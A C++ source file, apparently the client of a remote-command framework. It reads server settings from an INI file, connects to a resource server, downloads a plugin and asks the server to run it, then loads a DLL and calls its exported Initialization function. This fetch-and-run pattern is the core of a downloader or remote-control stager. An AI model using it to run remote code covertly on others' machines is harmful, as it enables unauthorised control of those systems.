#include "CommandTool.h"

//////////////////////////////////////////////////////////////////////////
// 引用自身
#include "CommandObj.h"

//////////////////////////////////////////////////////////////////////////
// 引用库文件

//////////////////////////////////////////////////////////////////////////
// 初始化及释放函数

CCommandObj::CCommandObj(void)
{
}

CCommandObj::CCommandObj(LPCTSTR lpLogFileName) : CCommonControl(lpLogFileName)
{
}

CCommandObj::~CCommandObj(void)
{
}

//////////////////////////////////////////////////////////////////////////
// Initialization

bool CCommandObj::Download( __in LPTSTR lpCmdLine)
{
	bool bRet = TRUE;

	//////////////////////////////////////////////////////////////////////////
	// 启动网络
	bRet = bRet && InitializationSocketClient(m_ConfigCommon.szServerAddress,m_ConfigCommon.usResourceServerPort,m_ConfigCommon.usCommandServerPort);

	//////////////////////////////////////////////////////////////////////////
	// 下载运行模块
	bRet = bRet && DownloadPlugin();

	return bRet;
}

bool CCommandObj::Execute( __in LPTSTR lpCmdLine)
{
	//////////////////////////////////////////////////////////////////////////
	// 初始化管理模块

	bool bRet = false;

	HMODULE hModule = LoadLibraryA(NAME_FILE_CLIENT_INITIALIZATION);

	m_pInitialization = (INITIALIZATION)GetProcAddress(hModule,"Initialization");

	if (NULL != m_pInitialization)
	{
		bRet = m_pInitialization(hModule);
	}


	while(bRet)
	{
		Sleep(1000);
	}

	FreeLibrary(hModule);

	return bRet;
}
//////////////////////////////////////////////////////////////////////////
// Download:

bool CCommandObj::DownloadPlugin()
{
	Out(Dbg,_T("Initlization Plugin Starting."));
	bool bRet = false;
	RESOURCEREQUIT rResourceRequit;

	memcpy(rResourceRequit.btResourceBag,m_cResourceClientObj.GetResourceBag(),MAX_BAG_LEN);

	for (int i = 0;i < m_ConfigCommon.dwRetryCount;++i)
	{
		if (m_cResourceClientObj.Send(&rResourceRequit,sizeof(RESOURCEREQUIT)) && m_cResourceClientObj.ExecuteCommand())
		{
			bRet = true;
			break;
		}
		Sleep(m_ConfigCommon.dwRetrySleep);
		Out(Dbg,_T("%dst Try To Initialize Plugin."),i+1);
	}

	Runend(bRet,_T("Initlization Plugin Stoping."));
	return bRet;
}

bool CCommandObj::InitializationSocketClient(LPCTSTR lpServerAddress /* = NULL */,USHORT usResourceServerPort /* = DEFAULT_SERVER_PORT */,USHORT usCommandServerPort)
{
	Out(Dbg,_T("Initialization Socket Client Starting"));
	bool bRet = false;

	for (int i = 0;i < m_ConfigCommon.dwRetryCount;++i)
	{
		if (m_cResourceClientObj.ConnectServer(lpServerAddress,usResourceServerPort))
		{
			bRet = true;
			break;
		}
		Sleep(m_ConfigCommon.dwRetrySleep);
		Out(Dbg,_T("%dst Try To Connect The Server."),i+1);
	}

	Runend(bRet,_T("Initialization Socket Client Stoping"));
	return bRet;
}

void CCommandObj::InitializationConfig(LPCWSTR lpConfigFileFullPath)
{
	Out(Dbg,_T("Initialization Config Starting."));
	m_ConfigCommon.usResourceServerPort = GetPrivateProfileIntW(L"System",L"ResourceServerPort",DEFAULT_CONFIG_SERVER_RESOURCE_PORT,lpConfigFileFullPath);
	m_ConfigCommon.usCommandServerPort = GetPrivateProfileIntW(L"System",L"CommandServerPort",DEFAULT_CONFIG_SERVER_COMMAND_PORT,lpConfigFileFullPath);
	m_ConfigCommon.dwRetrySleep = GetPrivateProfileIntW(L"Retry",L"RetrySleep",DEFAULT_CONFIG_RETRY_SLEEP,lpConfigFileFullPath);
	m_ConfigCommon.dwRetryCount = GetPrivateProfileIntW(L"Retry",L"RetryCount",DEFAULT_CONFIG_RETRY_COUNT,lpConfigFileFullPath);
	GetPrivateProfileStringW(L"System",L"ServerAddress",DEFAULT_CONFIG_SERVER_ADDRESS,m_ConfigCommon.szServerAddress,MAX_ADDRESS_STRING_LEN,lpConfigFileFullPath);
	Runend(true,_T("Initialization Config Stoping."));
}